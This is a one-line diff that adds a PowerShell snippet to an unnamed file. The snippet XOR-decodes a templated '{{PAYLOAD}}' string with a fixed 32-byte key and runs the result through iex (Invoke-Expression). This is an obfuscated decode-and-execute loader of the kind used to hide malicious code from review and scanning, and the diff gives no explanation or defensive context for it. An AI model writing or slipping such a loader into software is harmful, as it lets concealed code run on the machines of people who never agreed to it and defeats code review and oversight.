@@ -1,0 +1,1 @@
+$k=[byte[]](1..32); $p='{{PAYLOAD}}'.ToCharArray(); for($i=0;$i -lt $p.Length;$i++){$p[$i]=[char]($p[$i] -bxor $k[$i%32])}; iex (-join $p)
